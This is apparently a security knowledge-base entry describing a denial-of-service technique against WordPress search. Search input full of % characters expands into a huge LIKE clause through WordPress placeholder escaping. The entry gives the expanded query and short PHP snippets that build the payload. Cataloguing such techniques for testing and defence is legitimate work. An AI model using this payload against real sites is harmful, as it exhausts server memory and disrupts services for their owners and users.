---
id: cmd-search-dos
data: >-
  ((wp_posts.post_title LIKE
  '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}')
  OR (wp_posts.post_excerpt LIKE
  '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}')
  OR (wp_posts.post_content LIKE
  '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}'))
tags:
  - dos
  - memory-exhaustion
type: command
output: High memory consumption due to string expansion (66 chars per %)
executor: php
platforms:
  - WordPress
  - PHP
  - MySQL
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.724Z'
verified: false
validated: true
submitted: true
---
# dos-via-memory-exhaustion-in-search

## Command

```php
((wp_posts.post_title LIKE '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}') OR (wp_posts.post_excerpt LIKE '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}') OR (wp_posts.post_content LIKE '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}'))
```

## Description

Example prepared query output causing DoS via memory exhaustion when search input with many % characters expands to long strings (66 chars per % replacement) in WordPress search fields.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| LIKE '{hash}slavco{hash}' | Repeated pattern from % replacement in search query | Yes |

## Examples

### Basic Usage

```php
$search = str_repeat("%", 1000); // Input with many %
$wpdb->prepare("post_title LIKE %s", $search);
```

### Advanced Usage

```php
// Results in massive LIKE clause
$prepared = $wpdb->prepare("(title LIKE %s) OR (content LIKE %s)", $payload1, $payload2);
```

## Expected Output

Query with expanded strings causing high memory use during preparation/execution.

## Related

- [[Related Procedure]]
